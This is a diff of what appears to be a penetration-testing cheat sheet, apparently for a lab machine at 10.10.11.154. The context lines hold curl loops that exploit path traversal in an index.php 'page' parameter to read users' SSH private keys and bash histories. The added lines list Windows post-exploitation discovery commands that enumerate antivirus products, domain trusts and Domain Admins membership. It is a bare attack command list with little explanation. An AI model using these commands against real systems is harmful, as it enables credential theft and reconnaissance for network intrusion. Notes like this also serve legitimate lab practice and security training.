@@ -40,6 +40,16 @@ for i in {1000..5000}; do echo $i; curl -s "http://10.10.11.154/index.php?page=/
 while read line; do echo $line ; curl -v "http://10.10.11.154/index.php?page=/../../../home/${line}/.ssh/id_rsa"; done < users.txt
 while read line; do echo $line ; curl -v "http://10.10.11.154/index.php?page=/../../../home/${line}/.bash_history"; done < users.txt
 
+# POST-EXPLOITATION Discovery 
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List
+ipconfig /all
+systeminfo
+net config workstation
+nltest /domain_trusts
+nltest /domain_trusts /all_trusts
+net view /all /domain
+net view /all
+net group "Domain Admins" /domain
 
 ```
 
